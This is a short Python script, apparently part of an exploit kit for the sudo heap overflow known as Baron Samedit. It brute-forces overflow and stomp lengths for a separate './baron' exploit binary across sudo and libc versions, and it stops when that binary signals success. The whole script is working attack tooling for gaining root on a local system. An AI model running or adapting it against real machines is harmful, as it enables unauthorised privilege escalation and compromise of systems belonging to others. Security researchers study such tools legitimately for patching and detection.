### Baron The Brute
# Let's see how much of difference can there be
# amongst different sudo & libc versions
# UPDATE:   There seems to (obviously) be a big 
#           difference between 1.8/1.9 sudo versions

import time
import subprocess


def avg(vals):
    return sum(vals) // len(vals)


def make_generator(base, nrange):
    return lambda: (str(n) for n in range(base - nrange, base + nrange))


# smash_len_a
ARG_A_BASE = avg([56, 56, 64]) # You might want to choose one
ARG_A_RANGE = 5
ARG_A_GEN = make_generator(ARG_A_BASE, ARG_A_RANGE)

# smash_len_b
ARG_B_BASE = 54 # avg([54, 54, 49])
ARG_B_RANGE = 5
ARG_B_GEN = make_generator(ARG_B_BASE, ARG_B_RANGE)

# null_stomp_len
ARG_STOMP_BASE = 61 # avg([63, 63, 60])
ARG_STOMP_RANGE = 3
ARG_STOMP_GEN = make_generator(ARG_STOMP_BASE, ARG_STOMP_RANGE)

# lc_all_len
ARG_LCALL_BASE = 212 # avg([212, 212, 214])
ARG_LCALL_RANGE = 3
ARG_LCALL_GEN = make_generator(ARG_LCALL_BASE, ARG_LCALL_RANGE)


WORK = ARG_A_RANGE * ARG_B_RANGE * ARG_STOMP_RANGE * ARG_LCALL_RANGE * 16
work_str_len = len(str(WORK))
print(f"[:)] {WORK} loops to do. Starting in 3 ...")
time.sleep(3)

if __name__ == "__main__":
    args = ["./baron", "", "", "", ""]

    total = 0
    for A in ARG_A_GEN():
        for B in ARG_B_GEN():
            for ST in ARG_STOMP_GEN():
                for LC in ARG_LCALL_GEN():
                    total += 1
                    args[1], args[2] = A, B
                    args[3], args[4] = ST, LC

                    proc = subprocess.Popen(args)
                    try:
                        proc.wait(timeout=0.1)
                    except subprocess.TimeoutExpired:
                        # print("Timeout\n")
                        pass

                    # print(
                    #     f"[?] [{str(total).zfill(work_str_len)}/{WORK}] ret:",
                    #     f"{proc.returncode:3d}" if proc.returncode != None else "TIMEOUT",
                    #     f"args:{args[1:]}"
                    # )
                    
                    if total % 100 == 0:
                        print(f"[?] [{str(total).zfill(work_str_len)}/{WORK}]")

                    if proc.returncode == 42:
                        print("GOT IT:", args)
                        exit(0)
                    
                    #if proc.returncode == 0:
                    #    print("Wtf ret: 0 ?", args)
                    #    sleep(1)
